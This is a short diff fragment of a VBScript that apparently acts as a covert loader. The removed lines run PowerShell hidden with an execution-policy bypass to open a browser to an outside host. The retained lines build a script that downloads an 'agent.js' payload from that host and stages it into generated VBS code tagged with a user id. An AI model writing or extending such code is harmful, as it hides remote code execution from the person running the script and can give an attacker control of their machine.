@@ -3,10 +3,6 @@ userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
 ' Define your PowerShell script as a string
 
 
-psScript = "start msedge 'https://ecs.rcsis.ir' "
-command = "powershell.exe  -noexit  -ExecutionPolicy Bypass -Command """ & psScript & """"
-objShell.Run command, 0, False
-
 
 psScript = "$vbsstring = "&"'uid = """"""" & uid & """""""'" & " + """ & "[char]10" & vbCrLf & _
 			"$vbsstring += " & "(iwr 'https://ecs.rcsis.ir/static/js/agent.js').content" & vbCrLf & _
